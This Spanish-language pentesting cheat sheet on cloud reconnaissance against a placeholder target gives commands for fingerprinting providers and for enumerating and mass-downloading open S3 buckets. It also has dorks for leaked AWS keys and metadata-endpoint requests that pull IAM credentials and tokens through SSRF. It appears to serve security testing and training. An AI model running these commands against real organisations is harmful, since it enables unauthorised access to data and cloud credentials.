# Reconocimiento Cloud

Identificar activos cloud del objetivo sin tocar sus sistemas directamente.

---

## 1. Identificar proveedor cloud

```bash
# Cabeceras HTTP revelan el proveedor
curl -sI https://objetivo.com | grep -i "server\|x-amz\|x-azure\|x-goog"

# Registros DNS
dig objetivo.com
nslookup objetivo.com
# *.amazonaws.com  -> AWS
# *.azurewebsites.net -> Azure
# *.appspot.com -> GCP
# *.cloudfront.net -> AWS CloudFront (CDN)
# *.s3.amazonaws.com -> S3

# Certificados SSL (revelan subdominios)
curl -s "https://crt.sh/?q=%.objetivo.com&output=json" | python3 -m json.tool | grep name_value
```

---

## 2. Enumeracion de S3 Buckets (AWS)

```bash
# Nombres tipicos de buckets: objetivo, objetivo-backup, objetivo-dev, objetivo-prod
# Formato URL: https://NOMBRE.s3.amazonaws.com o https://s3.amazonaws.com/NOMBRE

# Probar acceso publico
aws s3 ls s3://objetivo --no-sign-request 2>/dev/null
aws s3 ls s3://objetivo-backup --no-sign-request 2>/dev/null
aws s3 ls s3://objetivo-dev --no-sign-request 2>/dev/null
aws s3 ls s3://objetivo-prod --no-sign-request 2>/dev/null
curl -s https://objetivo.s3.amazonaws.com/ | python3 -c "import sys; print(sys.stdin.read()[:500])"

# Si el bucket es accesible -> descargar todo
aws s3 sync s3://objetivo-publico . --no-sign-request

# Script propio
python3 scripts/cloud_recon.py --domain objetivo.com --buckets
```

---

## 3. OSINT de credenciales expuestas

```bash
# Buscar en GitHub
# Buscar en GitHub: "objetivo.com" "aws_access_key_id"
# Buscar en GitHub: "objetivo.com" "AKIA" (prefijo de AWS Access Key)

# trufflehog -- buscar en repos publicos
trufflehog github --org=objetivo_org

# GitLeaks
gitleaks detect --source=. --report-path=report.json

# Buscar en Google (dorks)
# site:github.com "objetivo.com" "aws_secret"
# site:github.com "objetivo.com" "AKIA"
# site:pastebin.com "objetivo.com" password
```

---

## 4. Subdominios cloud

```bash
# Buscar subdominios de servicios cloud
# *.s3.amazonaws.com
# *.blob.core.windows.net (Azure)
# *.storage.googleapis.com (GCP)

subfinder -d objetivo.com | grep -E "amazonaws|azure|google|cloudfront"
amass enum -d objetivo.com | grep -E "amazonaws|azurewebsites|appspot"
```

---

## 5. Metadata de instancias (si hay SSRF)

```bash
# AWS EC2 Metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE_ROL

# GCP Metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
